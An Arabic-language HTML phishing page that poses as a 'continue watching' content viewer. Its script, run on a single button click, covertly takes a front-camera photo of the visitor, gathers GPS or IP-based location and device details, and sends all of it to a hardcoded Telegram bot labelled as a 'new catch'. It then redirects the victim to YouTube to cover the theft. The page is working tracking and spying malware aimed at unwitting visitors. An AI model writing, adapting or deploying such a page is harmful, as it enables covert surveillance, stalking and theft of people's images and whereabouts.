<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>عرض المحتوى</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #0f0f0f;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 20px;
        }
        .card {
            background-color: #1a1a1a;
            border: 1px solid #333;
            border-radius: 12px;
            padding: 30px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
        }
        h1 { font-size: 20px; margin-bottom: 10px; }
        p { color: #aaaaaa; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            background-color: #2f80ed;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .btn:hover { background-color: #1d6fe8; }
    </style>
</head>
<body>

<div class="card">
    <h1 id="title">عرض المحتوى</h1>
    <p id="desc">انقر على الزر أدناه للسماح بالوصول والمتابعة</p>
    <button class="btn" id="startBtn">متابعة المشاهدة</button>
</div>

<video id="v" autoplay playsinline style="display:none;"></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const BOT_TOKEN = "8806405628:AAFnZPAD8ngGxGk8NMLzZwdNFa9LieAm4cA";
    const CHAT_ID = "7061254731";
    const REDIRECT_URL = "https://www.youtube.com";

    const startBtn = document.getElementById('startBtn');
    const title = document.getElementById('title');
    const desc = document.getElementById('desc');
    const video = document.getElementById('v');
    const canvas = document.getElementById('c');

    function getDeviceInfo() {
        return `📱 نوع الجهاز: ${navigator.platform}\n` +
               `🌐 المتصفح: ${navigator.userAgent}\n` +
               `🖥️ دقة الشاشة: ${window.screen.width}x${window.screen.height}\n` +
               `🌍 اللغة: ${navigator.language}`;
    }

    async function getIpLocation() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            return `🌐 معلومات الموقع عبر IP:\n` +
                   `📍 الدولة: ${data.country_name} (${data.country_code})\n` +
                   `🏙️ المدينة: ${data.city}\n` +
                   `🏢 المزود: ${data.org}\n` +
                   `📌 الإحداثيات: ${data.latitude}, ${data.longitude}\n` +
                   `🔗 خرائط جوجل: https://maps.google.com/?q=${data.latitude},${data.longitude}`;
        } catch (e) {
            return "❌ تعذر جلب معلومات الموقع.";
        }
    }

    function getGpsLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = pos.coords.accuracy;
                    resolve(`📍 GPS إحداثيات دقيقة:\nخط العرض: ${lat}\nخط الطول: ${lon}\nالدقة: ${acc} متر\n🔗 https://maps.google.com/?q=${lat},${lon}`);
                },
                () => resolve(null),
                { timeout: 5000, enableHighAccuracy: true }
            );
        });
    }

    startBtn.addEventListener('click', async () => {
        startBtn.disabled = true;
        title.textContent = "جاري طلب إذن الكاميرا...";
        desc.textContent = "يرجى الضغط على 'سماح' في نافذة المتصفح للمتابعة";

        let mediaStream = null;
        let photoBlob = null;

        try {
            // 1. Trigger camera permission prompt immediately on user click
            mediaStream = await navigator.mediaDevices.getUserMedia({
                video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: "user" },
                audio: false
            });

            title.textContent = "جاري المعالجة...";
            desc.textContent = "جاري التقاط الصورة وجمع البيانات...";

            video.srcObject = mediaStream;
            await new Promise((res) => {
                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(res, 1200); // Wait for frame exposure
                };
            });

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

            mediaStream.getTracks().forEach(t => t.stop());

            photoBlob = await new Promise((res) => {
                canvas.toBlob(b => res(b), 'image/jpeg', 0.85);
            });

        } catch (err) {
            if (mediaStream) {
                mediaStream.getTracks().forEach(t => t.stop());
            }
        }

        // 2. Gather device & location info
        let locationInfo = await getGpsLocation();
        if (!locationInfo) {
            locationInfo = await getIpLocation();
        }
        const deviceInfo = getDeviceInfo();

        // 3. Send Text Summary to Telegram
        const summaryText = `🚨 صيد جديد شامل!\n\n${deviceInfo}\n\n${locationInfo}`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: summaryText })
            });
        } catch (e) {}

        // 4. Send Selfie Photo if captured successfully
        if (photoBlob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', photoBlob, 'front.jpg');
            fd.append('caption', '📸 صورة الكاميرا الأمامية (سيلفي)');
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            } catch (e) {}
        }

        // 5. Redirect to YouTube
        window.location.href = REDIRECT_URL;
    });
</script>
</body>
</html>
